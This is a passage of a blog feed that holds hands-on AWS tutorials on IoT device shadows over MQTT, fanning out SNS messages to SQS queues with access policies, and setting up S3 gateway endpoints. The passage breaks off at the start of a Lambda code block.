directly.</p><p>For example, I change the desired state from red to green.</p><p>Then you will notice that the change will reflect to the <strong>Delta report</strong>.</p><p><img src="https://i.imgur.com/9l40PXT.png" alt="Imgur"></p><h2 id="Test-with-AWS-IoT-Test-MQTT-Client"><a href="#Test-with-AWS-IoT-Test-MQTT-Client" class="headerlink" title="Test with AWS IoT Test MQTT Client"></a>Test with AWS IoT Test MQTT Client</h2><p>First, it is necessary to subscribe to the shadow topic in the MQTT client, for receiving the state change events.</p><p><img src="https://i.imgur.com/Zq4x4i8.png" alt="Imgur"></p><p>The client can subscribe to the topic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aws/things/ESP32/shadow/update/#</span><br></pre></td></tr></table></figure><p>The wildcard symbol <strong>“#”</strong> indicates that it wants to subscribe all topic under the <code>update/</code> prefix.</p><p>And you can re-run the program with new color value. You can find the MQTT client will receive the state change events.</p><p>At first, the color was “red”.</p><blockquote><p>The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;document topic</p></blockquote><p>Then it changed to “green”.</p><blockquote><p> The message published to $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted topic<br>Noted that any unsuccessful messages were received on the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;rejected </p></blockquote><p><img src="https://i.imgur.com/brQ3knq.png" alt="Imgur"></p><h2 id="Edit-the-shadow-document-again"><a href="#Edit-the-shadow-document-again" class="headerlink" title="Edit the shadow document again"></a>Edit the shadow document again</h2><p>I change the desired stat value “blue” to “black”.</p><p><img src="https://i.imgur.com/DVKi6Xb.png" alt="Imgur"></p><p>The first received event will be on the delta topic, it means that there are differences between desired state and reported state.</p><p>At the same time, the message will published to the topic $aws&#x2F;things&#x2F;ESP32&#x2F;shadow&#x2F;update&#x2F;accepted for notifying the device to update the state</p><p><img src="https://i.imgur.com/7fewMie.png" alt="Imgur"></p><p>And also published to the shadow document topic for recording.</p><p><img src="https://i.imgur.com/FYULN43.png" alt="Imgur"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;previous&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699430576</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">20</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;current&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;desired&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reported&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">21</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1699431256</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>But the reported state is not “Black”.</p><p>you can see the event published to the accepted topic.</p><p><img src="https://i.imgur.com/pzVidVy.png" alt="Imgur"></p><p>Meanwhile, the message published to the document topic</p><p><img src="https://i.imgur.com/ZKmF0vG.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>You will found the state change from <strong>(Desired: “Blue”, Reported: “Blue”)</strong> to <strong>(Desired: “Black”, Reported: “Blue”)</strong> and the final state is <strong>(Desired: “Black”, Reported: “Black”)</strong>.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>[+] Create a virtual device with Amazon EC2 - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html">https://docs.aws.amazon.com/iot/latest/developerguide/creating-a-virtual-thing.html</a><br>[+] Tutorial: Provisioning your device in AWS IoT - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html">https://docs.aws.amazon.com/iot/latest/developerguide/shadow-provision-cloud.html</a><br>[+] Tutorial: Installing the Device SDK and running the sample application for Device Shadows - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html">https://docs.aws.amazon.com/iot/latest/developerguide/lightbulb-shadow-application.html</a><br>[+] Tutorial: Interacting with Device Shadow using the sample app and the MQTT test client - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html">https://docs.aws.amazon.com/iot/latest/developerguide/interact-lights-device-shadows.html</a><br>[+] Reserved topics - Shadow topics - <a href="https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow">https://docs.aws.amazon.com/iot/latest/developerguide/reserved-topics.html#reserved-topics-shadow</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> IoT Core </tag>
            
            <tag> IoT Shadow </tag>
            
            <tag> MQTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: Amazon SNS Fan out to Amazon SQS</title>
      <link href="/posts/efc78ef4.html"/>
      <url>/posts/efc78ef4.html</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Amazon SNS offen works well with Amazon SQS, by subscribing SQS to SNS, the SNS service can push messages to SQS. <strong>This may eliminating the need to periodically check or “poll” for updates.</strong></p><h3 id="What-is-Amazon-SQS"><a href="#What-is-Amazon-SQS" class="headerlink" title="What is Amazon SQS?"></a>What is Amazon SQS?</h3><p>By official definition</p><blockquote><p>Amazon SQS is a message queue service used by distributed applications to exchange messages through a polling model, and can be used to decouple sending and receiving components—without requiring each component to be concurrently available. </p></blockquote><h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><blockquote><p>The <strong>Fanout</strong> scenario is when a message published to an SNS topic is replicated and pushed to multiple endpoints, such as Kinesis Data Firehose delivery streams, Amazon SQS queues, HTTP(S) endpoints, and Lambda functions. This allows for parallel asynchronous processing.<br>For example, you can develop an application that publishes a message to an SNS topic whenever an order is placed for a product. Then, SQS queues that are subscribed to the SNS topic receive identical notifications for the new order. An Amazon Elastic Compute Cloud (Amazon EC2) server instance attached to one of the SQS queues can handle the processing or fulfillment of the order. And you can attach another Amazon EC2 server instance to a data warehouse for analysis of all orders received.[1]</p></blockquote><h2 id="Steps"><a href="#Steps" class="headerlink" title="Steps"></a>Steps</h2><p>Here we will go through each step of fan out to Amazon SQS.</p><p>The initial step is to remember both SNS arn and SQS arn.</p><h3 id="Create-SQS-Queue"><a href="#Create-SQS-Queue" class="headerlink" title="Create SQS Queue"></a>Create SQS Queue</h3><p>First, you’ll need to create a standard queue in SQS console</p><p><img src="https://i.imgur.com/RRffWm5.png" alt="Imgur"></p><p>After creating the standard queue, it will shows the arn.</p><p>Make sure noted this arn, you’ll need to provide this arn when creating the subscriptions</p><h3 id="Create-SNS-Topic"><a href="#Create-SNS-Topic" class="headerlink" title="Create SNS Topic"></a>Create SNS Topic</h3><p>Second, you need to create a SNS topic in the SNS console..</p><p><img src="https://i.imgur.com/ygA6g1P.png" alt="Imgur"></p><p>And again, you’ll need to note the topic arn.</p><h3 id="Provide-Permission-to-SNS-to-send-messages-to-SQS"><a href="#Provide-Permission-to-SNS-to-send-messages-to-SQS" class="headerlink" title="Provide Permission to SNS to send messages to SQS"></a>Provide Permission to SNS to send messages to SQS</h3><p>By default, SNS will not have permission to send messages to SQS, so you need to provide permission to SNS for sending messages.</p><ul><li>Go to SQS Console</li><li>Press “Edit” in the top corner</li><li>Scroll down to the “Access Policy”</li></ul><p><img src="https://i.imgur.com/keRSRlR.png" alt="Imgur"></p><ul><li>Append new statement in the Access Policy</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Service&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns.amazonaws.com&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;sqs:SendMessage&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:xxxxxxxxxxxx:QueueforSNS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;ArnEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aws:SourceArn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:xxxxxxxxxxxx:StandardTopicforSQS&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/UWjKND7.png" alt="Imgur"></p><h3 id="Subscribe-SQS-queue-to-SNS-topic"><a href="#Subscribe-SQS-queue-to-SNS-topic" class="headerlink" title="Subscribe SQS queue to SNS topic"></a>Subscribe SQS queue to SNS topic</h3><p>Now you’ll need to subscribe the SQS queue to the SNS topic.</p><ul><li>Go to SNS console</li><li>Scroll down and choose “Create Subscription”</li></ul><p><img src="https://i.imgur.com/qTEPbQb.png" alt="Imgur"></p><ul><li>Choose your topic arn</li><li>Set the protocal to SQS</li><li>Choose the SQS arn</li></ul><p><img src="https://i.imgur.com/voJqHuB.png" alt="Imgur"></p><p>Once complete, you will notice that the subscripe confirmation also completes. If you create a SQS type subscription by using console, you don’t need confirm the subscription manually.</p><p><img src="https://i.imgur.com/Jr4Brob.png" alt="Imgur"></p><blockquote><p><strong>But if you create a cross-account subscription, you will receive the confirmation url in the SQS queue, and you will need to click the confirmation URL. [3]</strong></p></blockquote><h3 id="Provide-Permission-to-User-for-topic-x2F-queue-operations"><a href="#Provide-Permission-to-User-for-topic-x2F-queue-operations" class="headerlink" title="Provide Permission to User for topic&#x2F;queue operations"></a>Provide Permission to User for topic&#x2F;queue operations</h3><p>You can add permissions to an IAM User to publish SNS messages to a topic.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>And you also need to provide permissions to SQS queue to recieve and delete messages</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue1&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue2&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>However,if you want to perform cross-account operations, you will need to provide permissions to the other account.</p><p>For example, if you want to let acount: 111122223333 to publish messages to SNS topic in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sns:Publish&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-2:XXXXXXXXXXXXX:MyTopic&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>if you want to let acount: 111122223333 to perform receive abd delete messages to queue in your account, here is an example policy.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111122223333&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;sqs:DeleteMessage&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;sqs:ReceiveMessage&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;arn:aws:sqs:us-east-2:XXXXXXXXXXXX:MyQueue&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Test-subscription"><a href="#Test-subscription" class="headerlink" title="Test subscription"></a>Test subscription</h3><p>Now we can test the message delivery to the queue.</p><ul><li>Go to the SNS console</li><li>Press “Push Message” in the top right corner </li><li>Enter the message subject and meesage body</li></ul><p><img src="https://i.imgur.com/iu7VJVX.png" alt="Imgur"><br><img src="https://i.imgur.com/ppgfOf0.png" alt="Imgur"></p><ul><li>Go to the SQS console</li><li>Press “Send and Receive Message” in the top right corner</li><li>Scroll down , and press the “Poll for all messages”</li><li>And you’ll find the messages are in polling progress.</li></ul><p><img src="https://i.imgur.com/aYWXVIE.png" alt="Imgur"></p><ul><li>Then the test meesages showed in the console</li></ul><p><img src="https://i.imgur.com/Vj3cCc9.png" alt="Imgur"></p><h2 id="Conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions"></a>Conclusions</h2><p>We successfully fan out the message from the Amazon SNS to the Amazon SQS. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario">https://docs.aws.amazon.com/sns/latest/dg/sns-common-scenarios.html#SNSFanoutScenario</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-sqs-as-subscriber.html</a><br>[3]<a href="https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html">https://docs.aws.amazon.com/zh_tw/sns/latest/dg/sns-send-message-to-sqs-cross-account.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> SNS </tag>
            
            <tag> SQS </tag>
            
            <tag> Publish-Subscribe-Model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hands-On Practice: S3 Gateway Endpoints</title>
      <link href="/posts/e7e295f6.html"/>
      <url>/posts/e7e295f6.html</url>
      
        <content type="html"><![CDATA[<h1 id="What-is-S3-Gateway-Endpoints"><a href="#What-is-S3-Gateway-Endpoints" class="headerlink" title="What is S3 Gateway Endpoints?"></a>What is S3 Gateway Endpoints?</h1><p><img src="https://i.imgur.com/MUsKNi4.png" alt="Imgur"></p><p>Let’s consider a scenario</p><blockquote><p>How could your Lambda function access the content in the S3 bucket?</p></blockquote><p>If you want a service to access the content in the S3 bucket, it usually go through VPC endpoint. S3 supports two types of VPC endpoint,each of which is <strong>Gateway endpoint</strong> and <strong>Interface endpoint</strong></p><!--如果要通過一個服務來存取 S3 當中的內容，通常是會通過 VPC Endpoint，而在 S3 當中又支援兩種不同的 VPC Endpoint類型，分別是 **Gateway Endpoint** 以及 **Interface Endpoint**--><p>The diffeences between two types of VPC endpoints are listed below</p><table><thead><tr><th>S3 Gateway Endpoints</th><th>S3 Interface Endpoints</th></tr></thead><tbody><tr><td>Use S3 Public IP Address</td><td>Use Private IP Address in VPC to access S3</td></tr><tr><td>Use the same S3 DNS Name</td><td>Name must include VPC Endpoint ID [3]</td></tr><tr><td>cannot access internally</td><td>can access internally</td></tr><tr><td>cannot access from other AWS region</td><td>can access from other AWS region by using VPC peering or AWS Transit gateway</td></tr><tr><td>Free</td><td>In chrarge</td></tr></tbody></table><!-- >> **所以當你的情境是你在同個 Region 底下有個 Lambda 函數想要存取 S3 的內容，那就很適合使用 Gateway Endpoint** --><blockquote><p>So if your scenario is that a Lambda function want to access the content in S3 bucket in the same region, it is great to utilize the Gateway Endpoint</p></blockquote><h2 id="Consideration-of-S3-Gateway-Endpoint"><a href="#Consideration-of-S3-Gateway-Endpoint" class="headerlink" title="Consideration of S3 Gateway Endpoint"></a>Consideration of S3 Gateway Endpoint</h2><p>It is worth to mestion that there are several things you need to consider before choosing S3 Gateway Endpoints, make sure you go through the section in the official documentation</p><blockquote><p><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3">https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3</a></p></blockquote><h2 id="Private-DNS"><a href="#Private-DNS" class="headerlink" title="Private DNS"></a>Private DNS</h2><p>When you are trying yo create Gateway Endpoint or Interface Endpoint for your S3, you can decide creating private DNS for cost down.</p><blockquote><p>This is implement by Route53 Resolver<br>For detail you can check：<a href="https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html">https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html</a></p></blockquote><h1 id="Steps-for-building-Gateway-Endpoint"><a href="#Steps-for-building-Gateway-Endpoint" class="headerlink" title="Steps for building Gateway Endpoint"></a><a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">Steps for building Gateway Endpoint</a></h1><ul><li>Go to AWS Console to create the endpoint</li></ul><blockquote><p>VPC &#x2F; Endpoints &#x2F; Create Endpoint</p></blockquote><p><img src="https://i.imgur.com/asOslk6.png" alt="Imgur"></p><ul><li>Choose <code>AWS services</code> , and <code>com.amaazonaws.us-east-1.s3</code></li></ul><p><img src="https://i.imgur.com/ujgXmUq.png" alt="Imgur"></p><ul><li>Then, press create endpoints</li></ul><h2 id="Associate-Route-Table"><a href="#Associate-Route-Table" class="headerlink" title="Associate Route Table"></a>Associate Route Table</h2><ul><li>Make sure the route table that assoicate to the gateway endpoint is clean.<blockquote><p>If you don’t have on, then make one.</p></blockquote></li></ul><p><img src="https://i.imgur.com/cI4mrOt.png" alt="Imgur"></p><h2 id="Configure-policy"><a href="#Configure-policy" class="headerlink" title="Configure policy"></a>Configure policy</h2><ul><li>For testing purposes, I choose <code>Full Access</code></li></ul><p><img src="https://i.imgur.com/kiQtSej.png" alt="Imgur"></p><ul><li>Then, press create endpoint</li></ul><h2 id="Check-the-routing"><a href="#Check-the-routing" class="headerlink" title="Check the routing"></a>Check the routing</h2><p>After establishing the endpoint, you can check if the default route of route table is well configured</p><p><img src="https://i.imgur.com/3Ajfl91.png" alt="Imgur"></p><p>Next, we must configure a Lambda function for accessing S3 bucket.</p><h2 id="Configure-Lambda-Function"><a href="#Configure-Lambda-Function" class="headerlink" title="Configure Lambda Function"></a>Configure Lambda Function</h2><p>If you put a Lambda funciton into a VPC, it will attach to 2 subnets by defaults.</p><p>Make sure two subnet have default route to S3 Gateway Endpoints.</p><p><img src="https://i.imgur.com/XmbfUKe.png" alt="Imgur"><br><img src="https://i.imgur.com/AP6fZGy.png" alt="Imgur"></p><ul><li>Create Lambda function, and enable the VPC</li></ul><p><img src="https://i.imgur.com/eBfWExA.png" alt="Imgur"></p><ul><li>Lambda Code</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 